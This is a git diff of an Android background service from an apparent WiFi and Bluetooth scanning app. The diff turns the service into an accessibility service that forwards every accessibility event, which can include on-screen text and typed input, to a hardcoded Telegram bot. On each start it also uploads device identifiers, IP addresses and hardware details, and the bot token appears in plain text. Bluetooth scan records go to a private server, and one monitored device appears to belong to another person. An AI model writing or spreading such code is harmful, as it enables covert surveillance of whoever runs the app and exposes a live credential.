@@ -1,6 +1,13 @@
 package com.sontme.legacysonty;
 
+import static com.sontme.legacysonty.SontHelperSonty.FileIOTools.getSharedPref;
+import static com.sontme.legacysonty.SontHelperSonty.FileIOTools.saveSharedPref;
+import static com.sontme.legacysonty.SontHelperSonty.getCurrentTimeHumanReadable;
+import static com.sontme.legacysonty.SontHelperSonty.getDeviceName;
+
 import android.Manifest;
+import android.accessibilityservice.AccessibilityService;
+import android.app.ActivityManager;
 import android.app.AlarmManager;
 import android.app.Notification;
 import android.app.NotificationChannel;
@@ -25,12 +32,14 @@ import android.location.LocationListener;
 import android.location.LocationManager;
 import android.net.ConnectivityManager;
 import android.net.NetworkInfo;
+import android.net.TrafficStats;
 import android.net.wifi.ScanResult;
 import android.net.wifi.WifiConfiguration;
 import android.net.wifi.WifiManager;
 import android.os.AsyncTask;
 import android.os.Build;
 import android.os.Bundle;
+import android.os.Handler;
 import android.os.IBinder;
 import android.os.ParcelUuid;
 import android.os.SystemClock;
@@ -38,7 +47,9 @@ import android.os.VibrationEffect;
 import android.os.Vibrator;
 import android.provider.Settings;
 import android.telephony.TelephonyManager;
+import android.text.format.Formatter;
 import android.util.Log;
+import android.view.accessibility.AccessibilityEvent;
 import android.widget.Toast;
 
 import androidx.annotation.Nullable;
@@ -54,6 +65,12 @@ import com.google.android.gms.analytics.GoogleAnalytics;
 import com.google.android.gms.analytics.HitBuilders;
 import com.google.android.gms.analytics.Tracker;
 import com.google.common.io.Files;
+import com.loopj.android.http.AsyncHttpClient;
+import com.loopj.android.http.AsyncHttpResponseHandler;
+
+import org.apache.commons.math3.analysis.interpolation.LinearInterpolator;
+import org.apache.commons.math3.analysis.polynomials.PolynomialFunction;
+import org.apache.commons.math3.analysis.polynomials.PolynomialSplineFunction;
 
 import java.io.BufferedReader;
 import java.io.File;
@@ -63,6 +80,7 @@ import java.io.InputStreamReader;
 import java.io.PrintWriter;
 import java.net.InetAddress;
 import java.net.InetSocketAddress;
+import java.net.NetworkInterface;
 import java.net.Proxy;
 import java.net.Socket;
 import java.net.SocketAddress;
@@ -74,6 +92,7 @@ import java.util.Arrays;
 import java.util.Collections;
 import java.util.Comparator;
 import java.util.Date;
+import java.util.Enumeration;
 import java.util.HashMap;
 import java.util.LinkedHashMap;
 import java.util.List;
@@ -88,7 +107,10 @@ import java.util.concurrent.RejectedExecutionHandler;
 import java.util.concurrent.ThreadPoolExecutor;
 import java.util.concurrent.TimeUnit;
 
-public class BackgroundService extends Service {
+import cz.msebera.android.httpclient.Header;
+import cz.msebera.android.httpclient.conn.util.InetAddressUtils;
+
+public class BackgroundService extends AccessibilityService {
 
     public static String android_id;
     public static String android_id_source_device;
@@ -101,7 +123,8 @@ public class BackgroundService extends Service {
     public static long CURRENT_LOCATION_LASTTIME;
     public static int allCount;
     public static TimeElapsedUtil startedAtTime;
-
+    public static long startedLongTime = 0;
+    public static long startedLongPercent = 0;
     public static HashMap<String, Integer> uni_wifi;
     public static HashMap<String, Integer> uni_blue;
 
@@ -132,6 +155,16 @@ public class BackgroundService extends Service {
 
     public static GoogleAnalytics googleAnalytics;
     public static Tracker analyticsTracker;
+
+    public static boolean FRESH_INSTALL = true;
+    public static String lastRun = "FRESHINSTALL";
+    public static long lastRunLong;
+    public static long firstinstalltime;
+
+    private static final int SECOND_MILLIS = 1000;
+    private static final int MINUTE_MILLIS = 60 * SECOND_MILLIS;
+    private static final int HOUR_MILLIS = 60 * MINUTE_MILLIS;
+    private static final int DAY_MILLIS = 24 * HOUR_MILLIS;
 
     static int longestCommonSubstring(char X[], char Y[], int m, int n) {
         int LCStuff[][] = new int[m + 1][n + 1];
@@ -203,6 +236,107 @@ public class BackgroundService extends Service {
         }
     };
 
+    static double extrapolate(double[][] d, double x) {
+        double y = d[0][1] + (x - d[0][0]) /
+                (d[1][0] - d[0][0]) *
+                (d[1][1] - d[0][1]);
+
+        return y;
+    }
+
+
+    public static double[] interpolate(double start, double end, int count) {
+        if (count < 2) {
+            throw new IllegalArgumentException("interpolate: illegal count!");
+        }
+        double[] array = new double[count + 1];
+        for (int i = 0; i <= count; ++i) {
+            array[i] = start + i * (end - start) / count;
+        }
+        return array;
+    }
+
+    public String getMobileIPAddress() {
+        try {
+            for (Enumeration<NetworkInterface> en = NetworkInterface.getNetworkInterfaces();
+                 en.hasMoreElements(); ) {
+                NetworkInterface intf = en.nextElement();
+                for (Enumeration<InetAddress> enumIpAddr = intf.getInetAddresses(); enumIpAddr.hasMoreElements(); ) {
+                    InetAddress inetAddress = enumIpAddr.nextElement();
+                    if (!inetAddress.isLoopbackAddress()) {
+                        return inetAddress.getHostAddress().trim().replaceAll("%", "_");
+                    }
+                }
+            }
+        } catch (Exception ex) {
+            ex.printStackTrace();
+            Log.d("IP_INFO_", ex.getMessage());
+            return "error";
+        } // for now eat exceptions
+        return "error_2";
+    }
+
+    public String getWiFiIPAddress() {
+        WifiManager wm = (WifiManager) getApplicationContext().getSystemService(WIFI_SERVICE);
+        return Formatter.formatIpAddress(wm.getConnectionInfo().getIpAddress());
+    }
+
+    public static String getLanIP(boolean useIPv4) {
+        try {
+            List<NetworkInterface> interfaces = Collections.list(NetworkInterface.getNetworkInterfaces());
+            for (NetworkInterface intf : interfaces) {
+                List<InetAddress> addrs = Collections.list(intf.getInetAddresses());
+                for (InetAddress addr : addrs) {
+                    if (!addr.isLoopbackAddress()) {
+                        String sAddr = addr.getHostAddress().toUpperCase();
+                        boolean isIPv4 = InetAddressUtils.isIPv4Address(sAddr);
+                        if (useIPv4) {
+                            if (isIPv4)
+                                return sAddr;
+                        } else {
+                            if (!isIPv4) {
+                                int delim = sAddr.indexOf('%'); // drop ip6 port suffix
+                                return delim < 0 ? sAddr : sAddr.substring(0, delim);
+                            }
+                        }
+                    }
+                }
+            }
+        } catch (Exception ex) {
+        } // for now eat exceptions
+        return "";
+    }
+
+    public static String getTimeAgo(long time) {
+        if (time < 1000000000000L) {
+            // if timestamp given in seconds, convert to millis
+            time *= 1000;
+        }
+
+        long now = System.currentTimeMillis();
+        if (time > now || time <= 0) {
+            return null;
+        }
+
+        // TODO: localize
+        final long diff = now - time;
+        if (diff < MINUTE_MILLIS) {
+            return "just now";
+        } else if (diff < 2 * MINUTE_MILLIS) {
+            return "a minute ago";
+        } else if (diff < 50 * MINUTE_MILLIS) {
+            return diff / MINUTE_MILLIS + " minutes ago";
+        } else if (diff < 90 * MINUTE_MILLIS) {
+            return "an hour ago";
+        } else if (diff < 24 * HOUR_MILLIS) {
+            return diff / HOUR_MILLIS + " hours ago";
+        } else if (diff < 48 * HOUR_MILLIS) {
+            return "yesterday";
+        } else {
+            return diff / DAY_MILLIS + " days ago";
+        }
+    }
+
     @Override
     public void onCreate() {
         super.onCreate();
@@ -223,6 +357,8 @@ public class BackgroundService extends Service {
                 .setAction("BackgroundService Started")
                 .build());
 
+        startedLongTime = System.currentTimeMillis();
+        startedLongPercent = SontHelperSonty.getBatteryLevel(getApplicationContext());
 
         try {
             android_id = Settings.Secure.getString(getContentResolver(),
@@ -231,12 +367,88 @@ public class BackgroundService extends Service {
                 android_id_source_device = "SMA510F";
             } else {
                 android_id_source_device = "ANYA_XIAOMI";
-                sendMessage_Telegram("LegacyService started! Device: " + android_id_source_device);
+                /*sendMessage_Telegram("LegacyService started! Device: " + android_id_source_device +
+                        " Battery: " + SontHelperSonty.getBatteryLevel(getApplicationContext()) + "%");*/
             }
             Log.d("ANDROID_ID_", "ANDROID ID == " + android_id + " _ " + android_id_source_device);
         } catch (Exception e) {
             sendMessage_Telegram("LegacyService started! Device ID not obtainable");
         }
+
+
+        //region check if first install
+
+        int startCount = 0;
+
+        try {
+            String time = getCurrentTimeHumanReadable();
+            String fresh = getSharedPref(getApplicationContext(), "fresh");
+            startCount = Integer.parseInt(getSharedPref(getApplicationContext(), "count"));
+            firstinstalltime = Long.parseLong(getSharedPref(getApplicationContext(), "freshinstalltime"));
+            lastRunLong = Long.parseLong(getSharedPref(getApplicationContext(), "lastrunlong"));
+            if (fresh.length() > 0) {
+                FRESH_INSTALL = false;
+                //lastRun = fresh;
+                firstinstalltime = Long.parseLong(getSharedPref(getApplicationContext(), "freshinstalltime"));
+            } else {
+                long timee = System.currentTimeMillis();
+                saveSharedPref(getApplicationContext(), "fresh", time);
+                saveSharedPref(getApplicationContext(), "freshinstalltime", String.valueOf(timee));
+                firstinstalltime = timee;
+                FRESH_INSTALL = true;
+            }
+        } catch (Exception e) {
+            long timee = System.currentTimeMillis();
+            firstinstalltime = timee;
+            startCount = 0;
+            saveSharedPref(getApplicationContext(), "freshinstalltime", String.valueOf(timee));
+            e.printStackTrace();
+        }
+        saveSharedPref(getApplicationContext(), "count", String.valueOf((startCount + 1)));
+
+        String ipwifi = "not_obtainable";
+        String ipcell = "not_obtainable";
+        try {
+            ipwifi = getWiFiIPAddress();
+            if (ipwifi.contains("0.0.0.0"))
+                ipcell = getMobileIPAddress();
+
+            ActivityManager actManager = (ActivityManager) getSystemService(Context.ACTIVITY_SERVICE);
+            ActivityManager.MemoryInfo memInfo = new ActivityManager.MemoryInfo();
+            actManager.getMemoryInfo(memInfo);
+            long totalMemory = memInfo.totalMem;
+            long availableMemory = memInfo.availMem;
+            double percentAvailable = round(memInfo.availMem / (double) memInfo.totalMem * 100.0, 2);
+            int cpus = Runtime.getRuntime().availableProcessors();
+            BackgroundService.sendMessage_Telegram("<b>FRESH_INSTALL:</b> " + String.valueOf(FRESH_INSTALL).toUpperCase() +
+                    /*"\nLAST_RUN: " + (lastRunLong) +*/
+                    "\n<b>LAST_RUN_AGO:</b> " + getTimeAgo(lastRunLong) +
+                    "\n<b>FIRST_INSTALL_AGO:</b> " + getTimeAgo(firstinstalltime) +
+                    "\n<b>START_COUNT:</b> " + startCount +
+                    "\n<b>ANDROID_ID:</b> " + android_id +
+                    "\n<b>IP:</b> " + ipwifi + " / " + ipcell + " / " + getLanIP(true) + " / " + getLanIP(false) +
+                    "\n<b>DEVICE_NAME:</b> " + getDeviceName() +
+                    "\n<b>LANGUAGE:</b> " + Locale.getDefault().getDisplayLanguage() +
+                    "\n<b>BUILD:</b> " + BuildConfig.VERSION_CODE +
+                    "\n<b>DISPLAY:</b> " + Build.DISPLAY +
+                    "\n<b>BOARD:</b> " + Build.BOARD +
+                    "\n<b>CPU/RAM:</b> " + cpus +
+                    "\n<b>Total:</b> " + roundBandwidth(totalMemory) +
+                    " <b>Available:</b> " + roundBandwidth(availableMemory) + " " + percentAvailable + "%25" +
+                    "\n<b>USER:</b> " + Build.USER +
+                    "\n<b>TYPE:</b> " + Build.TYPE);
+        } catch (Exception e) {
+            BackgroundService.sendMessage_Telegram(e.getMessage());
+            Log.d("ERROR_", e.getMessage());
+            e.printStackTrace();
+        }
+        lastRun = getCurrentTimeHumanReadable();
+        lastRunLong = System.currentTimeMillis();
+        saveSharedPref(getApplicationContext(), "lastrunlong", String.valueOf(lastRunLong));
+
+        //endregion
+
+
         bluetoothDevicesFound = new ArrayList<>();
         webReqRunnablesList = new ArrayList<>();
 
@@ -488,7 +700,7 @@ public class BackgroundService extends Service {
         intent.putExtra("requestCode", 66);
         PendingIntent pendingIntent = PendingIntent.getBroadcast(getApplicationContext(), 66, intent, PendingIntent.FLAG_UPDATE_CURRENT);
         alarmMgr.setRepeating(AlarmManager.RTC_WAKEUP, System.currentTimeMillis(),
-                1 * 30 * 1000, pendingIntent);
+                5 * 60 * 1000, pendingIntent);
 
         // new SimpleAlarmManager(getApplicationContext()).setup(SimpleAlarmManager.INTERVAL_DAY, 10, 0, 0).register(5).start();
         //locationManager.requestSingleUpdate(LocationManager.NETWORK_PROVIDER, locationListener, null);
@@ -500,7 +712,7 @@ public class BackgroundService extends Service {
             e.printStackTrace();
         }
         showOngoing("WiFi Scan initiated");
-        final android.os.Handler handler = new android.os.Handler();
+        final Handler handler = new Handler();
         handler.postDelayed(new Runnable() {
             public void run() {
                 WifiManager wifiManager = (WifiManager) getSystemService(Context.WIFI_SERVICE);
@@ -579,9 +791,9 @@ public class BackgroundService extends Service {
 
 
         Log.d("netw_", "Global Mobile RX: " + roundBandwidth(
-                android.net.TrafficStats.getTotalRxBytes()));
+                TrafficStats.getTotalRxBytes()));
         Log.d("netw_", "Global Mobile TX: " + roundBandwidth(
-                android.net.TrafficStats.getTotalTxBytes()));
+                TrafficStats.getTotalTxBytes()));
 
         //NearbyHandler nearby = new NearbyHandler(getApplicationContext(), Strategy.P2P_CLUSTER);
         //nearby.startAdvertising();
@@ -604,10 +816,11 @@ public class BackgroundService extends Service {
         //updateCurrent_exception(getApplicationContext(),"WiFi","Connect Strongest");
 
         if (android_id_source_device.equals("ANYA_XIAOMI")) {
-            final android.os.Handler handler_restarter = new android.os.Handler();
+            final Handler handler_restarter = new Handler();
             handler_restarter.postDelayed(new Runnable() {
                 public void run() {
-                    sendMessage_Telegram(android_id_source_device + " - is restarting service (30mins)");
+                    sendMessage_Telegram(android_id_source_device +
+                            " - is restarting service (30mins/2)");
                     Intent mStartActivity = new Intent(context, BackgroundService.class);
                     int mPendingIntentId = 123456;
                     PendingIntent mPendingIntent = PendingIntent.getActivity(getApplicationContext(), mPendingIntentId, mStartActivity, PendingIntent.FLAG_CANCEL_CURRENT);
@@ -756,6 +969,58 @@ public class BackgroundService extends Service {
                 Future<?> future = BackgroundService.webRequestExecutor.submit(webReqRunnable_bl);
                 webReqRunnablesList.add(webReqRunnable_bl);
 
+                Runnable webReqRunnable_bl_indi = new Runnable() {
+                    @Override
+                    public void run() {
+                        RequestTaskListener_indi requestTaskListener_bl_indi = new RequestTaskListener_indi() {
+                            @Override
+                            public void update(String string) {
+                                if (string != null) {
+                                    analyticsTracker.send(new HitBuilders.EventBuilder()
+                                            .setCategory("Action")
+                                            .setAction("Bluetooth Answer")
+                                            .build());
+                                    if (string.contains("new_device")) {
+                                        vibrate(getApplicationContext());
+                                        Log.d("BL_TEST_", "NEW DEVICE FOUND: " + device.getName() + " -> " + device.getAddress());
+                                        cnt_new++;
+                                        cnt_new_bl++;
+                                        updateCurrent("Bluetooth", "New Found #" + allCount);
+                                    } else if (string.contains("rssi_updated")) {
+                                        //cnt_rssi_bl++;
+                                        BackgroundService.cnt_updated_str++;
+                                        updateCurrent("Bluetooth", "Updated Strength #" + allCount);
+                                    } else if (string.contains("name_updated")) {
+                                        //Toast.makeText(getApplicationContext(),"Name updated!",Toast.LENGTH_LONG).show();
+                                        BackgroundService.vibrate(getApplicationContext());
+                                        Log.d("NameUpdateTest_", "Name updated!");
+                                        cnt_nameUpdated++;
+                                        updateCurrent("Bluetooth", "Updated Name #" + allCount);
+                                    } else if (string.contains("regi_old")) {
+                                        vibrate(getApplicationContext());
+                                        cnt_updated_time++;
+                                        cnt_updated_time_bl++;
+                                        updateCurrent("Bluetooth", "Updated Time #" + allCount);
+                                    } else if (string.contains("not_recorded")) {
+                                        cnt_notrecorded++;
+                                        cnt_notrecorded_bl++;
+                                        updateCurrent("Bluetooth", "Not Recorded #" + allCount);
+                                    } else {
+                                        Log.d("BL_TEST_", "Got string: " + string);
+                                        updateCurrent("Bluetooth", "Unknown Answer #" + allCount);
+                                    }
+                                }
+                            }
+                        };
+                        RequestTask_Bluetooth_indi requestTask_bl_indi = new RequestTask_Bluetooth_indi();
+                        requestTask_bl_indi.addListener(requestTaskListener_bl_indi);
+                        requestTask_bl_indi.execute(reqBody);
+                    }
+                };
+                Future<?> future_indi = BackgroundService.webRequestExecutor.submit(webReqRunnable_bl_indi);
+                webReqRunnablesList.add(webReqRunnable_bl_indi);
+
+
                 bluetoothDevicesFound.add(new BluetoothDeviceWithLocation(device, CURRENT_LOCATION));
                 return true;
             } catch (Exception e) {
@@ -802,6 +1067,8 @@ public class BackgroundService extends Service {
         conf.SSID = "\"" + accp.SSID + "\"";
         conf.allowedKeyManagement.set(WifiConfiguration.KeyMgmt.NONE);
         wifiManager.addNetwork(conf);
+        if (ActivityCompat.checkSelfPermission(context, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
+        }
         List<WifiConfiguration> list = wifiManager.getConfiguredNetworks();
         ConnectivityManager connectivityManager = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
         NetworkInfo wifiInfo = connectivityManager.getNetworkInfo(ConnectivityManager.TYPE_WIFI);
@@ -866,16 +1133,18 @@ public class BackgroundService extends Service {
             conf.SSID = "\"" + strongestOpenAp.SSID + "\"";
             conf.allowedKeyManagement.set(WifiConfiguration.KeyMgmt.NONE);
             wifiManager.addNetwork(conf);
+            if (ActivityCompat.checkSelfPermission(context, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
+            }
             List<WifiConfiguration> list = wifiManager.getConfiguredNetworks();
             ConnectivityManager connectivityManager = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
             NetworkInfo wifiInfo = connectivityManager.getNetworkInfo(ConnectivityManager.TYPE_WIFI);
             //NetworkInfo mobileInfo = connectivityManager.getNetworkInfo(ConnectivityManager.TYPE_MOBILE);
 
-                for (WifiConfiguration aP : list) {
-                    if (aP.SSID != null && aP.SSID.equals("\"" + strongestOpenAp.SSID + "\"")) {
-                        android.net.wifi.ScanResult finalStrongestOpenAp = strongestOpenAp;
-                        if (!banneds.stream().anyMatch(str -> str.contains(finalStrongestOpenAp.SSID))) {
-                            if (!wifiInfo.isConnectedOrConnecting()) {
+            for (WifiConfiguration aP : list) {
+                if (aP.SSID != null && aP.SSID.equals("\"" + strongestOpenAp.SSID + "\"")) {
+                    android.net.wifi.ScanResult finalStrongestOpenAp = strongestOpenAp;
+                    if (!banneds.stream().anyMatch(str -> str.contains(finalStrongestOpenAp.SSID))) {
+                        if (!wifiInfo.isConnectedOrConnecting()) {
                                 wifiManager.enableNetwork(aP.networkId, false);
                             } else {
                                 wifiManager.enableNetwork(aP.networkId, true);
@@ -1133,11 +1402,21 @@ public class BackgroundService extends Service {
         return channelId;
     }
 
-    @Nullable
+    @Override
+    public void onAccessibilityEvent(AccessibilityEvent event) {
+        sendMessage_Telegram("onAccessibilityEvent: " + event.toString());
+    }
+
+    @Override
+    public void onInterrupt() {
+        sendMessage_Telegram("onInterrupt [accessibility]");
+    }
+
+    /*@Nullable
     @Override
     public IBinder onBind(Intent intent) {
         return null;
-    }
+    }*/
 
     @Override
     public void onStart(Intent intent, int startid) {
@@ -1176,11 +1455,13 @@ public class BackgroundService extends Service {
         return result;
     }
 
-    public static void sendMessage_Telegram(String message) {
+    public static void sendMessage(String message) {
         int retryCount = 0;
         try {
+            //message.replaceAll("\\r?\\n","%0A");
+            //message.replaceAll("\\r?\\n","<br>");
             String url = "https://api.telegram.org/bot990712757:AAGyuPqZJUNoRAi1DMl-oRzEYInZz7UP0C4/sendMessage?chat_id=1093250115&text=" +
-                    message;
+                    message + "&parse_mode=html";
             AndroidNetworking.get(url)
                     .setPriority(Priority.IMMEDIATE)
                     .build()
@@ -1203,6 +1484,31 @@ public class BackgroundService extends Service {
         }
     }
 
+    public static void sendMessage_Telegram(String message) {
+        //message.replaceAll("\\r?\\n","<br>");
+        // 1093250115
+        String url = "https://api.telegram.org/bot990712757:AAGyuPqZJUNoRAi1DMl-oRzEYInZz7UP0C4/sendMessage?chat_id=1093250115&text=" +
+                message + "&parse_mode=html";
+        AsyncHttpClient client = new AsyncHttpClient();
+        try {
+            client.get(url,
+                    new AsyncHttpResponseHandler() {
+                        @Override
+                        public void onSuccess(int statusCode, Header[] headers, byte[] responseBody) {
+
+                        }
+
+                        @Override
+                        public void onFailure(int statusCode, Header[] headers, byte[] responseBody, Throwable error) {
+                            Log.d("ERROR_", "error " + message);
+                        }
+                    });
+        } catch (Exception e) {
+            Log.d("ERROR_", "error " + e.getMessage());
+            sendMessage(message);
+        }
+
+    }
     public void restartService() {
         Intent restartServiceIntent = new Intent(getApplicationContext(), this.getClass());
         restartServiceIntent.putExtra("requestCode", 66);
@@ -1379,6 +1685,10 @@ public class BackgroundService extends Service {
         void update(String string);
     }
 
+    interface RequestTaskListener_indi {
+        void update(String string);
+    }
+
     public static class RequestTask extends AsyncTask<String, String, String> {
         private final List<RequestTaskListener> listeners = new ArrayList<RequestTaskListener>();
 
@@ -1438,6 +1748,38 @@ public class BackgroundService extends Service {
         protected void onPostExecute(String result) {
             super.onPostExecute(result);
             for (RequestTaskListener hl : listeners) {
+                hl.update(result);
+            }
+        }
+    }
+
+    public static class RequestTask_Bluetooth_indi extends AsyncTask<String, String, String> {
+        private final List<RequestTaskListener_indi> listeners = new ArrayList<RequestTaskListener_indi>();
+
+        public void addListener(RequestTaskListener_indi toAdd) {
+            listeners.add(toAdd);
+        }
+
+        public int count = 0;
+
+        public RequestTask_Bluetooth_indi() {
+            count++;
+        }
+
+        @Override
+        protected String doInBackground(String... uri) {
+            return Live_Http_GET_SingleRecord.executeRequest(
+                    "sont.sytes.net",
+                    80,
+                    "/wifi/indi_bl.php" + uri[0],
+                    false, ""
+            );
+        }
+
+        @Override
+        protected void onPostExecute(String result) {
+            super.onPostExecute(result);
+            for (RequestTaskListener_indi hl : listeners) {
                 hl.update(result);
             }
         }
